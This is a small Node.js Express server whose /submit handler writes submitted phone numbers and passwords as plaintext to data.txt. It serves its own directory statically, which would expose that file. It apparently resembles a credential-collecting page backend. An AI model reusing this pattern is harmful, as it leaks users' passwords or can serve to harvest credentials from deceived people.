const express = require('express');
const multer = require('multer');  // For handling form data and file uploads
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const submitRoute = require('./submit'); // Import submit route
const viewRoute = require('./view');     // Import view route

const app = express();
const port = 3000;

// Set up multer for parsing form data
const upload = multer();

// Middleware to parse JSON and urlencoded bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like index.html)
app.use(express.static(path.join(__dirname, '/')));

// Handle form submission
app.post('/submit', upload.none(), (req, res) => {
  const { phone, password } = req.body;
  const data = `Phone: ${phone}, Password: ${password}\n`; // Collect form data
  fs.appendFileSync('data.txt', data);  // Append data to the file
  res.sendStatus(200);  // Send a success response
});

// Use the API routes
app.use('/api', submitRoute);  // Register submit route
app.use('/api', viewRoute);    // Register view route

// Start the server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});